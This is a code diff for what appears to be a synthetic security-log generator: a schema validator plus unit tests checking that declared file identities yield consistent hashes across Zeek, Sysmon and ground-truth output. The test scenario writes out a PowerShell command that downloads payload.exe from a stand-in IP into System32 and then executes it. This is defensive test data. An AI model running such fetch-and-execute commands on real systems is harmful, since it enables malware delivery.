+     time_window: TimeWindow
+@@ -2486,3 +2537,20 @@ class Scenario(BaseModel):
+         if not re.match(r"^[a-zA-Z0-9_-]+$", v):
+             raise ValueError("observation_profile must be a simple profile name")
+         return v
++
++    @model_validator(mode="after")
++    def validate_file_content_references(self) -> "Scenario":
++        """Reject undeclared role-specific file references at schema validation time."""
++
++        for reference in self.content_identities:
++            if not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9._:-]{0,127}", reference):
++                raise ValueError(f"invalid content_identities reference: {reference}")
++        for step in [*(self.storyline or []), *self.red_herrings]:
++            for event in step.events:
++                for field_name in ("response_content_ref", "image_content_ref"):
++                    reference = getattr(event, field_name, None)
++                    if reference is not None and reference not in self.content_identities:
++                        raise ValueError(
++                            f"{field_name} references undeclared content identity {reference!r}"
++                        )
++        return self
+diff --git a/tests/unit/test_content_identity.py b/tests/unit/test_content_identity.py
+new file mode 100644
+index 0000000..e9166cf
+--- /dev/null
++++ b/tests/unit/test_content_identity.py
+@@ -0,0 +1,455 @@
++# Copyright (c) 2026 Peter Hanily
++# SPDX-License-Identifier: MIT
++
++"""Contracts for opt-in, role-specific file-content identity."""
++
++import json
++import random
++import re
++import xml.etree.ElementTree as ET
++from datetime import UTC, datetime
++
++import pytest
++from pydantic import ValidationError
++
++import evidenceforge.generation.actions.file_transfer as file_transfer_actions
++from evidenceforge.events.base import SecurityEvent
++from evidenceforge.events.content import FileContentIdentity, FileContentRegistry
++from evidenceforge.events.contexts import (
++    FileTransferContext,
++    HostContext,
++    ImageLoadContext,
++    ProcessContext,
++)
++from evidenceforge.formats import load_format
++from evidenceforge.generation.actions.file_transfer import (
++    HttpResponseFileTransferActionBundle,
++    HttpResponseFileTransferRequest,
++)
++from evidenceforge.generation.activity.network import REVERSE_DNS
++from evidenceforge.generation.emitters.sysmon import SysmonEventEmitter
++from evidenceforge.generation.engine import GenerationEngine
++from evidenceforge.models.scenario import ConnectionEventSpec, ProcessEventSpec, Scenario
++from evidenceforge.utils.rng import _stable_seed
++
++
++def _sha1_from_sysmon_hashes(value: str) -> str:
++    match = re.search(r"(?:^|,)SHA1=([0-9A-F]+)", value)
++    assert match is not None
++    return match.group(1).lower()
++
++
++def _imphash_from_sysmon_hashes(value: str) -> str:
++    match = re.search(r"(?:^|,)IMPHASH=([0-9A-F]+)", value)
++    assert match is not None
++    return match.group(1)
++
++
++def _scenario_data() -> dict:
++    return {
++        "version": "1.0",
++        "name": "content-identity-prototype",
++        "description": "Role-specific file-content identity integration test",
++        "content_identities": {
++            "downloader-v1": {"kind": "synthetic_file"},
++            "payload-v1": {"kind": "synthetic_file"},
++        },
++        "environment": {
++            "description": "One Windows host and one Zeek sensor",
++            "users": [
++                {
++                    "username": "analyst",
++                    "full_name": "Test Analyst",
++                    "email": "analyst@example.test",
++                    "primary_system": "TEST-01",
++                    "enabled": True,
++                }
++            ],
++            "systems": [
++                {
++                    "hostname": "TEST-01",
++                    "ip": "10.0.0.10",
++                    "os": "Windows 11 Enterprise",
++                    "type": "workstation",
++                    "assigned_user": "analyst",
++                }
++            ],
++            "network": {
++                "segments": [
++                    {
++                        "name": "workstations",
++                        "cidr": "10.0.0.0/24",
++                        "exposure": "internal",
++                        "systems": ["TEST-01"],
++                    }
++                ],
++                "sensors": [
++                    {
++                        "type": "network",
++                        "name": "core-zeek",
++                        "hostname": "ZEEK-01",
++                        "monitoring_segments": ["workstations"],
++                        "direction": "bidirectional",
++                        "placement": "span",
++                        "log_formats": ["zeek"],
++                    }
++                ],
++            },
++        },
++        "time_window": {"start": "2024-01-15T10:00:00Z", "duration": "1h"},
++        "baseline_activity": {
++            "description": "Low background",
++            "intensity": "low",
++            "variation": "low",
++        },
++        "storyline": [
++            {
++                "id": "download-execute",
++                "time": "+15m",
++                "actor": "analyst",
++                "system": "TEST-01",
++                "activity": "Download one declared object and execute its exact path",
++                "event_spacing": {"mode": "explicit_offsets", "offsets": ["0s", "30s"]},
++                "events": [
++                    {
++                        "type": "process",
++                        "process_name": (
++                            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
++                        ),
++                        "command_line": (
++                            "powershell.exe -Command \"Invoke-WebRequest -Uri "
++                            "'http://203.0.113.10/payload.exe' -OutFile "
++                            "'C:\\Windows\\System32\\payload.exe'\""
++                        ),
++                        "response_content_ref": "payload-v1",
++                        "image_content_ref": "downloader-v1",
++                        "supplementary": "none",
++                    },
++                    {
++                        "type": "process",
++                        "process_name": r"C:\Windows\System32\payload.exe",
++                        "command_line": r"C:\Windows\System32\payload.exe --demo",
++                        "image_content_ref": "payload-v1",
++                        "supplementary": "none",
++                    },
++                ],
++            }
++        ],
++        "output": {
++            "logs": [{"format": "windows"}, {"format": "zeek"}],
++            "destination": "./output",
++            "compression": False,
++        },
++    }
++
++
++def test_process_content_fields_are_role_specific() -> None:
++    """One event may carry two distinct identities because their roles are named."""
++
++    both_roles = ProcessEventSpec(
++        process_name="downloader.exe",
++        command_line="downloader.exe http://example.test/payload.exe -o payload.exe",
++        response_content_ref="payload-v1",
++        image_content_ref="downloader-v1",
++    )
++    assert both_roles.response_content_ref == "payload-v1"
++    assert both_roles.image_content_ref == "downloader-v1"
++    with pytest.raises(ValidationError, match="explicit command_line"):
++        ProcessEventSpec(process_name="powershell.exe", response_content_ref="payload-v1")
++    with pytest.raises(ValidationError, match="service=http"):
++        ConnectionEventSpec(
++            dst_ip="203.0.113.10",
++            service="ssl",
++            uri="/payload.exe",
++            response_content_ref="payload-v1",
++        )
++    with pytest.raises(ValidationError, match="response-body HTTP method"):
++        ConnectionEventSpec(
++            dst_ip="203.0.113.10",
++            service="http",
++            method="HEAD",
++            uri="/payload.exe",
++            response_content_ref="payload-v1",
++        )
++    with pytest.raises(ValidationError, match="greater than 100"):
++        ConnectionEventSpec(
++            dst_ip="203.0.113.10",
++            service="http",
++            uri="/payload.exe",
++            response_body_len=100,
++            response_content_ref="payload-v1",
++        )
++
++    scenario = _scenario_data()
++    scenario["storyline"][0]["events"][1]["image_content_ref"] = "undeclared"
++    with pytest.raises(ValidationError, match="undeclared content identity"):
++        Scenario.model_validate(scenario)
++
++
++def test_content_identity_is_scenario_scoped_and_has_no_imphash() -> None:
++    """The registry is deterministic, scenario-scoped, and standard-digest-only."""
++
++    first = FileContentIdentity.synthetic("scenario-a", "payload-v1")
++    again = FileContentIdentity.synthetic("scenario-a", "payload-v1")
++    other_scenario = FileContentIdentity.synthetic("scenario-b", "payload-v1")
++
++    assert first == again
++    assert first.digests.sha1 != other_scenario.digests.sha1
++    assert first.provenance == "synthetic_v1"
++    assert first.derivation_version == 1
++    assert not hasattr(first, "imphash")
++    assert first.digests.hashes_for([]) == {}
++    assert first.digests.hashes_for(["sHa1"]) == {"sha1": first.digests.sha1}
++    registry = FileContentRegistry("scenario-a", {"payload-v1"})
++    assert registry.resolve("payload-v1") is registry.resolve("payload-v1")
++    with pytest.raises(ValueError, match="unknown file content reference"):
++        registry.resolve("undeclared")
++    with pytest.raises(ValueError, match="sha1 conflicts"):
++        FileTransferContext(content_identity=first, sha1="0" * 40)
++
++
++def test_response_and_process_contexts_share_sha1_but_not_imphash() -> None:
++    """Standard digests join while Sysmon keeps its separate legacy import identity."""
++
++    identity = FileContentIdentity.synthetic("scenario-a", "payload-v1")
++    transfer = HttpResponseFileTransferActionBundle(
++        HttpResponseFileTransferRequest(
++            host="203.0.113.10",
++            uri="/payload.exe",
++            dst_ip="203.0.113.10",
++            response_body_len=8_000_000,
++            response_mime_types=["application/x-msdownload"],
++            timestamp=datetime(2026, 8, 1, 12, 0, tzinfo=UTC),
++            content_identity=identity,
++        ),
++        random.Random(4),
++    ).execute()
++    process = ProcessContext(
++        pid=4100,
++        parent_pid=4000,
++        image=r"C:\Users\analyst\Downloads\payload.exe",
++        command_line="payload.exe",
++        username="analyst",
++        image_content_identity=identity,
++    )
++    execution = SecurityEvent(
++        timestamp=datetime(2026, 8, 1, 12, 1, tzinfo=UTC),
++        event_type="process_create",
++        process=process,
++    )
++    sysmon_hashes = SysmonEventEmitter._process_hashes_for_event(
++        execution,
++        process.image,
++    )
++    legacy_hashes = SysmonEventEmitter._generate_hashes(process.image)
++
++    assert transfer.file_transfer.content_identity is identity
++    assert transfer.file_transfer.analyzers == ["SHA1"]
++    assert transfer.file_transfer.sha1 == identity.digests.sha1
++    assert _sha1_from_sysmon_hashes(sysmon_hashes) == identity.digests.sha1
++    assert _imphash_from_sysmon_hashes(sysmon_hashes) == _imphash_from_sysmon_hashes(
++        legacy_hashes
++    )
++
++
++def test_known_response_identity_preserves_sensor_hash_absence(
++    monkeypatch: pytest.MonkeyPatch,
++) -> None:
++    """World truth remains attached when analyzer loss suppresses every observed hash."""
++
++    identity = FileContentIdentity.synthetic("scenario-a", "payload-v1")
++    monkeypatch.setattr(
++        file_transfer_actions,
++        "_http_file_analysis_loss",
++        lambda response_body_len, rng: (512, True),
++    )
++    transfer = HttpResponseFileTransferActionBundle(
++        HttpResponseFileTransferRequest(
++            host="203.0.113.10",
++            uri="/payload.exe",
++            dst_ip="203.0.113.10",
++            response_body_len=8_000_000,
++            response_mime_types=["application/x-msdownload"],
++            timestamp=datetime(2026, 8, 1, 12, 0, tzinfo=UTC),
++            content_identity=identity,
++        ),
++        random.Random(4),
++    ).execute()
++
++    assert transfer.file_transfer.content_identity is identity
++    assert transfer.file_transfer.analyzers == []
++    assert transfer.file_transfer.sha1 == ""
++
++
++def test_process_image_identity_does_not_leak_into_eid7(tmp_path) -> None:
++    """A DLL load keeps its own legacy identity even when its owner has an explicit one."""
++
++    identity = FileContentIdentity.synthetic("scenario-a", "payload-v1")
++    process = ProcessContext(
++        pid=4100,
++        parent_pid=4000,
++        image=r"C:\Windows\System32\payload.exe",
++        command_line="payload.exe",
++        username="analyst",
++        image_content_identity=identity,
++    )
++    host = HostContext(
++        hostname="TEST-01",
++        ip="10.0.0.10",
++        os="Windows 11 Enterprise",
++        os_category="windows",
++        system_type="workstation",
++        domain="example.test",
++        fqdn="TEST-01.example.test",
++        netbios_domain="EXAMPLE",
++    )
++    image_loaded = r"C:\Windows\System32\kernel32.dll"
++    event = SecurityEvent(
++        timestamp=datetime(2026, 8, 1, 12, 1, tzinfo=UTC),
++        event_type="image_load",
++        src_host=host,
++        process=process,
++        image_load=ImageLoadContext(
++            image_loaded=image_loaded,
++            signed=True,
++            signature="Microsoft Windows",
++            signature_status="Valid",
++        ),
++    )
++    emitter = SysmonEventEmitter(
++        load_format("windows_event_sysmon"),
++        tmp_path / "sysmon.xml",
++        buffer_size=100,
++    )
++    emitter._render_sysmon_image_loaded(event)
++    rendered_hashes = emitter._event_dicts[0]["Hashes"]
++    metadata = emitter._get_pe_metadata(image_loaded, host)
++    if metadata == ("-", "-", "-", "-", "-"):
++        metadata = emitter._signed_module_metadata(image_loaded, "Microsoft Windows")
++    expected_hashes = emitter._generate_hashes(
++        image_loaded,
++        host,
++        rendered_identity=metadata,
++    )
++
++    assert rendered_hashes == expected_hashes
++    assert identity.digests.sha1.upper() not in rendered_hashes
++
++
++def test_unannotated_http_transfer_keeps_legacy_seed_domain() -> None:
++    """The opt-in branch does not alter existing hashes or action identifiers."""
++
++    request = HttpResponseFileTransferRequest(
++        host="203.0.113.10",
++        uri="/payload.exe",
++        dst_ip="203.0.113.10",
++        response_body_len=8_000_000,
++        response_mime_types=["application/x-msdownload"],
++        timestamp=datetime(2026, 8, 1, 12, 0, tzinfo=UTC),
++    )
++    legacy = HttpResponseFileTransferActionBundle(request, random.Random(4)).execute()
++    identity = FileContentIdentity.synthetic("scenario-a", "payload-v1")
++    opted_in = HttpResponseFileTransferActionBundle(
++        HttpResponseFileTransferRequest(
++            host=request.host,
++            uri=request.uri,
++            dst_ip=request.dst_ip,
++            response_body_len=request.response_body_len,
++            response_mime_types=request.response_mime_types,
++            timestamp=request.timestamp,
++            content_identity=identity,
++        ),
++        random.Random(4),
++    ).execute()
++
++    assert legacy.file_transfer.sha1
++    assert legacy.file_transfer.sha1 != opted_in.file_transfer.sha1
++    legacy_stable_seed = _stable_seed(
++        "action_bundle:http_file_transfer:"
++        f"{request.host}:{request.uri}:{request.dst_ip}:{request.response_body_len}:"
++        f"{','.join(request.response_mime_types)}:{request.timestamp.isoformat()}:"
++        f"{request.parent_duration or ''}:{request.source}"
++    )
++    assert request.stable_id == f"http-file-transfer-{legacy_stable_seed:016x}"
++
++
++def test_generated_scenario_joins_role_specific_zeek_and_sysmon_sha1(tmp_path) -> None:
++    """A real generation run projects one declared identity into both sources."""
++
++    scenario = Scenario.model_validate(_scenario_data())
++    reverse_dns_before = dict(REVERSE_DNS)
++    try:
++        GenerationEngine(scenario, tmp_path).generate()
++    finally:
++        REVERSE_DNS.clear()
++        REVERSE_DNS.update(reverse_dns_before)
++    identity = FileContentIdentity.synthetic(scenario.name, "payload-v1")
++    downloader_identity = FileContentIdentity.synthetic(scenario.name, "downloader-v1")
++
++    files_rows = [
++        json.loads(line)
++        for path in tmp_path.rglob("files.json")
++        for line in path.read_text().splitlines()
++        if line.strip()
++    ]
++    http_rows = [
++        json.loads(line)
++        for path in tmp_path.rglob("http.json")
++        for line in path.read_text().splitlines()
++        if line.strip()
++    ]
++    download_http = [
++        row for row in http_rows if row.get("method") == "GET" and row.get("uri") == "/payload.exe"
++    ]
++    assert len(download_http) == 1
++    response_fuids = set(download_http[0]["resp_fuids"])
++    download_files = [row for row in files_rows if row.get("fuid") in response_fuids]
++    assert len(download_files) == 1
++    assert download_files[0]["sha1"] == identity.digests.sha1
++
++    target_hashes = []
++    for path in tmp_path.rglob("windows_event_sysmon.xml"):
++        xml = re.sub(r"<\?xml[^>]+\?>", "", path.read_text())
++        root = ET.fromstring("<Root>" + xml + "</Root>")
++        for event in (node for node in root.iter() if node.tag.endswith("Event")):
++            fields = {
++                node.attrib.get("Name"): node.text
++                for node in event.iter()
++                if node.tag.endswith("Data")
++            }
++            event_id = next(
++                (node.text for node in event.iter() if node.tag.endswith("EventID")),
++                None,
++            )
++            if event_id == "1" and fields.get("Image") == r"C:\Windows\System32\payload.exe":
++                target_hashes.append(fields["Hashes"])
++    assert len(target_hashes) == 1
++    assert _sha1_from_sysmon_hashes(target_hashes[0]) == identity.digests.sha1
++
++    ground_truth = json.loads((tmp_path / "GROUND_TRUTH.json").read_text())
++    assert ground_truth["schema_version"] == 2
++    response_attributes = [
++        event["attributes"]
++        for event in ground_truth["events"]
++        if "response_content_identity_digests" in event["attributes"]
++    ]
++    assert len(response_attributes) == 1
++    assert response_attributes[0]["response_content_identity_provenance"] == "synthetic_v1"
++    assert response_attributes[0]["response_content_identity_version"] == 1
++    assert response_attributes[0]["response_content_identity_digests"]["sha1"] == (
++        identity.digests.sha1
++    )
++    assert response_attributes[0]["image_content_ref"] == "downloader-v1"
++    assert response_attributes[0]["image_content_identity_digests"]["sha1"] == (
++        downloader_identity.digests.sha1
++    )
++    image_sha1s = {
++        event["attributes"]["image_content_identity_digests"]["sha1"]
++        for event in ground_truth["events"]
++        if "image_content_identity_digests" in event["attributes"]
++    }
++    assert image_sha1s == {identity.digests.sha1, downloader_identity.digests.sha1}
++    manifest = json.loads((tmp_path / "OBSERVATION_MANIFEST.json").read_text())
++    assert manifest["schema_version"] == 2
++    assert manifest["content_identity_model"] == "synthetic_v1"
++    assert manifest["content_identity_version"] == 1
